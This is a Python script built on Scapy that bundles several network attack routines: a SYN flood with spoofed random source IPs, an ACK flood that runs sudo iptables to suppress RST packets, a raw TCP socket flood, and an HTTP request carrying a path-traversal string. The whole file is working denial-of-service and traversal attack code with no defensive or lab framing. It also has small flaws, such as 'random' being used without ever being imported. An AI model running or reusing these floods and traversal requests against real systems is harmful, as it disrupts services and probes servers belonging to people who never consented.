from scapy.all import*
import os
import time
from ftplib import FTP
from threading import Thread
import socket

def syn_flood(src, dst, dport):
    print("[*] Initiating SYN flood attack to Ip address "+str(dst)+". Press ctrl-c to exit the program.")
    srcIP = RandIP("192.168.1.1/24")
    srcPort = RandShort()
    ip = IP(src = srcIP, dst = dst)
    tcp = TCP(sport = srcPort, dport = dport, flags = "S")
    raw = Raw(b"X"*1024)
    SYN = ip/ tcp/ raw
    print("[*] sending SYN packets...\n")
    i = 1
    try:
        start_time = time.time()
        while(True):
            send(SYN, loop = 0, verbose = 0)
            print(str(i), "SYN packets sent.", end = "\r")
            i+=1
    except KeyboardInterrupt:
        runtime = time.time()-start_time
        print(str(i), "SYN packets sent. Runtime", round(runtime,3) ,"seconds.")
        print("Rate:", round(i/runtime,3), "packets per second.")


def ACK_attack(src, dst, dport):
    print("[*] Initiating ACK attack to Ip address "+str(dst)+". Press ctrl-c to exit the program.")
    cmd = "sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP"
    os.system(cmd)
    i = 1
    print("[*] sending ACK packets after receiving SYN/ACK from target...")
    try:
        start_time = time.time()
        while(True):
            #syn
            sport = random.randint(1024, 65535)
            ip = IP(src = src, dst = dst)
            SYN = TCP(sport = sport, dport = dport, flags='S', seq = 1000)
            SYNACK=sr1(ip/SYN, verbose = 0)

            #ack
            ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
            send(ip/ACK, verbose = 0)
            print(str(i), "ACK packets sent.", end = "\r")
            i+=1
    except KeyboardInterrupt:
        runtime = time.time()-start_time
        print(str(i), "ACK packets sent. Runtime", round(runtime,3) ,"seconds.")
        print("Rate:", round(i/runtime,3), "packets per second.")
        os.system("sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")

def lpacket_raw(src, dst, dport):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((dst,int(dport)))
        i = 1
        start_time = time.time()
        while(True):
            c.send(b"X"*512)
            response = c.recv(4096)
            print(str(i), "packets sent.", end = "\r")
            i+=1
    except KeyboardInterrupt:
        runtime = time.time()-start_time
        print(str(i), "packets sent. Runtime", round(runtime,3) ,"seconds.")
        print("Rate:", round(i/runtime,3), "packets per second.")
        c.close()

def HTTPhackery(src, dst, dport):
    #syn
    sport = random.randint(1024, 65535)
    ip = IP(src = src, dst = dst)
    SYN = TCP(sport = sport, dport = dport, flags='S')
    SYNACK=sr1(ip/SYN, verbose = 0)

    #ack
    ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
    #getStr = 'GET '+ '/htdocs/application.html HTTP/1.1\r\n'+"X"*1024+'Host: '+ dst +"\r\n\r\n"
    getStr = 'GET '+ '/htdocs/application.html/../../ HTTP/1.1\r\n'+'Host: '+ dst +"\r\n\r\n"
    print("HTTP request sent:", getStr)
    reply = sr1(ip/ACK/getStr)
    print(reply)